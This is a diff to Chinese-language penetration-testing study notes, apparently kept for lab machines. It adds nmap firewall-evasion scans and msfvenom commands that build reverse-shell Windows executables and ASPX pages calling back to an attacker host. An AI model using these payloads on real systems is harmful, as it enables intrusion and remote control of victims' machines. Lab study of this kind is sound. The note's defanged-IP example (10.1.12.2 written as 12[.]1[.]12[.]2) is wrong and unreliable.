@@ -217,11 +217,11 @@ sudo nmap -sSU -p 53 --script dns-nsid 10.129.2.48（测试过真正能用的）
 
 
 >规避防火墙
-
+```
 sudo nmap -sSU -p 53 --script dns-nsid 10.129.2.48
 
 sudo nmap -Pn --min-rate 10000 --source-port 53  -sV 10.129.67.88 -n --disable-arp-ping
-
+```
 
 
 ### msfvenom
@@ -234,7 +234,7 @@ msfvenom -p <payload> LHOST=<本地IP> LPORT=<监听端口> -f <文件类型> -o
 
 msfvenom -p windows/shell_reverse_tcp LHOST=10.10.239.167 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
 
-
+msfvenom -p windows/x64/shell_reverse_tcp LHOST= LPORT= -f aspx -o  reverse-shell.aspx 
 
 
 ### wireshark
@@ -778,4 +778,6 @@ gzip:压缩和解压缩的工具，zcat命令可以读取压缩文件的内容
 ### 血的教训
 
 - Linux的文件系统一定要非常了解，以便于识别出在根目录的其他文件夹
-- 
+- unkown的端口再扫一遍
+- ip地址的Defanged Version(去义版本)就是在.的左右加上中括号。ep：10.1.12.2的去义版本就是12[.]1[.]12[.]2
+-
